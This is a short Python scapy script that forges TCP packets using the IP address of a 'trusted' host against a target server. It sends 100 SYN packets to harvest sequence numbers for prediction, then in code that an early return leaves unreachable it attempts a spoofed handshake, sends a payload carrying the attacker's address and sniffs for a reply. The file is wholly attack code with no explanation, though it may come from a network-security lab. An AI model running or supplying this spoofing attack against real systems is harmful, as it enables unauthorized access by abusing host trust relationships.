from scapy.all import *


def main(args):
  localip = args[0]
  serverip = args[1]
  trustedip = args[2]
  trustedport = 31337
  ip = IP(src=trustedip, dst=serverip)
  seqs = []
  for i in range(0,100):
    sport = random.randint(1024,65535)
    SYN=TCP(sport=sport,dport=trustedport,flags='S',seq=1000)
    SYNACK=sr1(ip/SYN)
    seqs.append(SYNACK.seq)
  for s in seqs:
    print(s)
  return
  ip = IP(src=trustedip, dst=serverip)
  
  SYN=TCP(sport=sport,dport=int(trustedport),flags='S',seq=0)
  ipsyn = ip/SYN
  (ipsyn).show()
  SYNACK=sr1(ipsyn)
  SYNACK.show()
  ACK=TCP(sport=sport, dport=int(trustedport), flags='A', seq=1, ack=1)
  ipack = ip/ACK
  ipack.show()
  send(ipack)
  
  
  spoof = ip / TCP(sport=sport, dport=trustedport, seq=1, ack=1) / Raw(localip)
  spoof.show()
  fs = "udp and host " + localip + " and port " + str(trustedport)
  send(spoof)
  pkts = sniff(filter=fs, count=1)
  pkts.show()
  
  
if __name__ == "__main__":
  main(sys.argv[1:])
